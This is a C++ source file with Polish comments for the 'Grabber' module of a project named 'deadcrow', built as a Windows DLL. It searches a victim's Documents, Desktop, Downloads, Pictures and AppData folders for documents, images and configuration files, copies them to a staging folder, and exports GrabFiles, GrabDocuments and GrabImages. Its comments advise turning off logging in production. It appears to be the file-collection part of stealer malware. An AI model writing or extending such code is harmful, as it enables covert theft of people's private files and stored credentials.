#include "grabber.h"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <regex>
#include <shlobj.h>

namespace fs = std::filesystem;

namespace deadcrow {
namespace modules {

Grabber::Grabber() {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[GRABBER] " << status << std::endl;
        #endif
    };
    
    // Domyślny callback postępu (nic nie robi)
    progress_callback_ = [](int, int) {};
}

Grabber::~Grabber() {
    // Nic do czyszczenia
}

std::vector<Grabber::FileInfo> Grabber::findFiles(const std::string& directory, const std::string& pattern, bool recursive) {
    reportStatus("Wyszukiwanie plików w katalogu: " + directory + " według wzorca: " + pattern);
    
    std::vector<FileInfo> files;
    
    try {
        // Konwertuj wzorzec na wyrażenie regularne
        std::regex regex_pattern(pattern, std::regex::icase);
        
        // Opcja przeszukiwania
        fs::directory_options options = recursive ? fs::directory_options::follow_directory_symlink : fs::directory_options::none;
        
        // Licznik plików (do raportowania postępu)
        int total_files = 0;
        int processed_files = 0;
        
        // Najpierw policz pliki (do raportowania postępu)
        if (recursive) {
            for (const auto& entry : fs::recursive_directory_iterator(directory, options)) {
                if (fs::is_regular_file(entry)) {
                    total_files++;
                }
            }
        } else {
            for (const auto& entry : fs::directory_iterator(directory)) {
                if (fs::is_regular_file(entry)) {
                    total_files++;
                }
            }
        }
        
        // Przeszukaj katalog
        if (recursive) {
            for (const auto& entry : fs::recursive_directory_iterator(directory, options)) {
                if (fs::is_regular_file(entry)) {
                    // Sprawdź, czy nazwa pliku pasuje do wzorca
                    std::string filename = entry.path().filename().string();
                    if (std::regex_search(filename, regex_pattern)) {
                        files.push_back(getFileInfo(entry.path().string()));
                    }
                    
                    // Raportuj postęp
                    processed_files++;
                    reportProgress(processed_files, total_files);
                }
            }
        } else {
            for (const auto& entry : fs::directory_iterator(directory)) {
                if (fs::is_regular_file(entry)) {
                    // Sprawdź, czy nazwa pliku pasuje do wzorca
                    std::string filename = entry.path().filename().string();
                    if (std::regex_search(filename, regex_pattern)) {
                        files.push_back(getFileInfo(entry.path().string()));
                    }
                    
                    // Raportuj postęp
                    processed_files++;
                    reportProgress(processed_files, total_files);
                }
            }
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas wyszukiwania plików: " + std::string(e.what()));
    }
    
    reportStatus("Znaleziono " + std::to_string(files.size()) + " plików");
    return files;
}

std::vector<Grabber::FileInfo> Grabber::findFilesByExtension(const std::string& directory, const std::vector<std::string>& extensions, bool recursive) {
    reportStatus("Wyszukiwanie plików w katalogu: " + directory + " według rozszerzeń");
    
    std::vector<FileInfo> files;
    
    try {
        // Opcja przeszukiwania
        fs::directory_options options = recursive ? fs::directory_options::follow_directory_symlink : fs::directory_options::none;
        
        // Licznik plików (do raportowania postępu)
        int total_files = 0;
        int processed_files = 0;
        
        // Najpierw policz pliki (do raportowania postępu)
        if (recursive) {
            for (const auto& entry : fs::recursive_directory_iterator(directory, options)) {
                if (fs::is_regular_file(entry)) {
                    total_files++;
                }
            }
        } else {
            for (const auto& entry : fs::directory_iterator(directory)) {
                if (fs::is_regular_file(entry)) {
                    total_files++;
                }
            }
        }
        
        // Przeszukaj katalog
        if (recursive) {
            for (const auto& entry : fs::recursive_directory_iterator(directory, options)) {
                if (fs::is_regular_file(entry)) {
                    // Sprawdź, czy rozszerzenie pliku jest na liście
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                    
                    for (const auto& ext : extensions) {
                        if (extension == ext) {
                            files.push_back(getFileInfo(entry.path().string()));
                            break;
                        }
                    }
                    
                    // Raportuj postęp
                    processed_files++;
                    reportProgress(processed_files, total_files);
                }
            }
        } else {
            for (const auto& entry : fs::directory_iterator(directory)) {
                if (fs::is_regular_file(entry)) {
                    // Sprawdź, czy rozszerzenie pliku jest na liście
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                    
                    for (const auto& ext : extensions) {
                        if (extension == ext) {
                            files.push_back(getFileInfo(entry.path().string()));
                            break;
                        }
                    }
                    
                    // Raportuj postęp
                    processed_files++;
                    reportProgress(processed_files, total_files);
                }
            }
        }
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas wyszukiwania plików: " + std::string(e.what()));
    }
    
    reportStatus("Znaleziono " + std::to_string(files.size()) + " plików");
    return files;
}

bool Grabber::copyFiles(const std::vector<FileInfo>& files, const std::string& destination) {
    reportStatus("Kopiowanie plików do katalogu: " + destination);
    
    // Sprawdź, czy katalog docelowy istnieje
    if (!fs::exists(destination)) {
        // Utwórz katalog
        try {
            fs::create_directories(destination);
        }
        catch (const std::exception& e) {
            reportStatus("Nie udało się utworzyć katalogu docelowego: " + std::string(e.what()));
            return false;
        }
    }
    
    // Licznik plików (do raportowania postępu)
    int total_files = files.size();
    int processed_files = 0;
    int copied_files = 0;
    
    // Kopiuj pliki
    for (const auto& file : files) {
        // Utwórz ścieżkę docelową
        std::string dest_path = destination + "\\" + file.name;
        
        // Kopiuj plik
        if (copyFile(file.path, dest_path)) {
            copied_files++;
        }
        
        // Raportuj postęp
        processed_files++;
        reportProgress(processed_files, total_files);
    }
    
    reportStatus("Skopiowano " + std::to_string(copied_files) + " z " + std::to_string(total_files) + " plików");
    return copied_files > 0;
}

bool Grabber::copyFilesWithSizeLimit(const std::vector<FileInfo>& files, const std::string& destination, uint64_t max_size_bytes) {
    reportStatus("Kopiowanie plików do katalogu: " + destination + " z limitem rozmiaru: " + std::to_string(max_size_bytes) + " bajtów");
    
    // Sprawdź, czy katalog docelowy istnieje
    if (!fs::exists(destination)) {
        // Utwórz katalog
        try {
            fs::create_directories(destination);
        }
        catch (const std::exception& e) {
            reportStatus("Nie udało się utworzyć katalogu docelowego: " + std::string(e.what()));
            return false;
        }
    }
    
    // Licznik plików (do raportowania postępu)
    int total_files = files.size();
    int processed_files = 0;
    int copied_files = 0;
    uint64_t total_size = 0;
    
    // Kopiuj pliki
    for (const auto& file : files) {
        // Sprawdź, czy nie przekroczono limitu rozmiaru
        if (total_size + file.size > max_size_bytes) {
            reportStatus("Osiągnięto limit rozmiaru");
            break;
        }
        
        // Utwórz ścieżkę docelową
        std::string dest_path = destination + "\\" + file.name;
        
        // Kopiuj plik
        if (copyFile(file.path, dest_path)) {
            copied_files++;
            total_size += file.size;
        }
        
        // Raportuj postęp
        processed_files++;
        reportProgress(processed_files, total_files);
    }
    
    reportStatus("Skopiowano " + std::to_string(copied_files) + " z " + std::to_string(total_files) + " plików");
    reportStatus("Łączny rozmiar: " + std::to_string(total_size) + " bajtów");
    return copied_files > 0;
}

std::vector<Grabber::FileInfo> Grabber::scanForDocuments(const std::vector<std::string>& extensions) {
    reportStatus("Skanowanie typowych lokalizacji w poszukiwaniu dokumentów");
    
    std::vector<FileInfo> files;
    
    // Pobierz typowe lokalizacje użytkownika
    std::vector<std::string> directories = getUserDirectories();
    
    // Przeszukaj każdy katalog
    for (const auto& directory : directories) {
        // Przeszukaj katalog
        std::vector<FileInfo> found_files = findFilesByExtension(directory, extensions, true);
        
        // Dodaj znalezione pliki do listy
        files.insert(files.end(), found_files.begin(), found_files.end());
    }
    
    reportStatus("Znaleziono " + std::to_string(files.size()) + " dokumentów");
    return files;
}

std::vector<Grabber::FileInfo> Grabber::scanForImages(const std::vector<std::string>& extensions) {
    reportStatus("Skanowanie typowych lokalizacji w poszukiwaniu obrazów");
    
    std::vector<FileInfo> files;
    
    // Pobierz typowe lokalizacje użytkownika
    std::vector<std::string> directories = getUserDirectories();
    
    // Przeszukaj każdy katalog
    for (const auto& directory : directories) {
        // Przeszukaj katalog
        std::vector<FileInfo> found_files = findFilesByExtension(directory, extensions, true);
        
        // Dodaj znalezione pliki do listy
        files.insert(files.end(), found_files.begin(), found_files.end());
    }
    
    reportStatus("Znaleziono " + std::to_string(files.size()) + " obrazów");
    return files;
}

std::vector<Grabber::FileInfo> Grabber::scanForConfigFiles(const std::vector<std::string>& extensions) {
    reportStatus("Skanowanie typowych lokalizacji w poszukiwaniu plików konfiguracyjnych");
    
    std::vector<FileInfo> files;
    
    // Pobierz typowe lokalizacje użytkownika
    std::vector<std::string> directories = getUserDirectories();
    
    // Dodaj katalog AppData
    char app_data[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app_data))) {
        directories.push_back(app_data);
    }
    
    // Dodaj katalog LocalAppData
    char local_app_data[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_app_data))) {
        directories.push_back(local_app_data);
    }
    
    // Przeszukaj każdy katalog
    for (const auto& directory : directories) {
        // Przeszukaj katalog
        std::vector<FileInfo> found_files = findFilesByExtension(directory, extensions, true);
        
        // Dodaj znalezione pliki do listy
        files.insert(files.end(), found_files.begin(), found_files.end());
    }
    
    reportStatus("Znaleziono " + std::to_string(files.size()) + " plików konfiguracyjnych");
    return files;
}

std::vector<std::string> Grabber::getUserDirectories() {
    std::vector<std::string> directories;
    
    // Pobierz katalog dokumentów
    char documents[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents))) {
        directories.push_back(documents);
    }
    
    // Pobierz katalog pulpitu
    char desktop[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop))) {
        directories.push_back(desktop);
    }
    
    // Pobierz katalog pobierania
    char downloads[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, downloads))) {
        std::string downloads_path = std::string(downloads) + "\\Downloads";
        if (fs::exists(downloads_path)) {
            directories.push_back(downloads_path);
        }
    }
    
    // Pobierz katalog obrazów
    char pictures[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, 0, pictures))) {
        directories.push_back(pictures);
    }
    
    return directories;
}

Grabber::FileInfo Grabber::getFileInfo(const std::string& path) {
    FileInfo info;
    
    try {
        // Pobierz ścieżkę
        info.path = path;
        
        // Pobierz nazwę pliku
        info.name = fs::path(path).filename().string();
        
        // Pobierz rozszerzenie
        info.extension = fs::path(path).extension().string();
        
        // Pobierz rozmiar
        info.size = fs::file_size(path);
        
        // Pobierz datę modyfikacji
        auto last_write_time = fs::last_write_time(path);
        auto last_write_time_t = std::chrono::system_clock::to_time_t(
            std::chrono::time_point_cast<std::chrono::system_clock::duration>(
                last_write_time - fs::file_time_type::clock::now() + std::chrono::system_clock::now()
            )
        );
        
        std::tm tm_time;
        localtime_s(&tm_time, &last_write_time_t);
        
        char buffer[64];
        strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &tm_time);
        info.last_modified = buffer;
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas pobierania informacji o pliku: " + std::string(e.what()));
    }
    
    return info;
}

bool Grabber::copyFile(const std::string& source, const std::string& destination) {
    try {
        // Kopiuj plik
        fs::copy_file(source, destination, fs::copy_options::overwrite_existing);
        return true;
    }
    catch (const std::exception& e) {
        reportStatus("Błąd podczas kopiowania pliku: " + std::string(e.what()));
        return false;
    }
}

void Grabber::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Grabber::setProgressCallback(std::function<void(int, int)> callback) {
    progress_callback_ = callback;
}

void Grabber::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

void Grabber::reportProgress(int current, int total) {
    if (progress_callback_) {
        progress_callback_(current, total);
    }
}

BOOL WINAPI Grabber::DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Inicjalizacja DLL
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            // Czyszczenie przy wyładowaniu DLL
            break;
    }
    
    return TRUE;
}

// Implementacja funkcji eksportowanych

extern "C" __declspec(dllexport) bool GrabFiles(const char* directory, const char* pattern, const char* destination, bool recursive) {
    try {
        Grabber grabber;
        std::vector<Grabber::FileInfo> files = grabber.findFiles(directory, pattern, recursive);
        return grabber.copyFiles(files, destination);
    }
    catch (const std::exception& e) {
        return false;
    }
}

extern "C" __declspec(dllexport) bool GrabDocuments(const char* destination) {
    try {
        Grabber grabber;
        std::vector<Grabber::FileInfo> files = grabber.scanForDocuments();
        return grabber.copyFiles(files, destination);
    }
    catch (const std::exception& e) {
        return false;
    }
}

extern "C" __declspec(dllexport) bool GrabImages(const char* destination) {
    try {
        Grabber grabber;
        std::vector<Grabber::FileInfo> files = grabber.scanForImages();
        return grabber.copyFiles(files, destination);
    }
    catch (const std::exception& e) {
        return false;
    }
}

} // namespace modules
} // namespace deadcrow
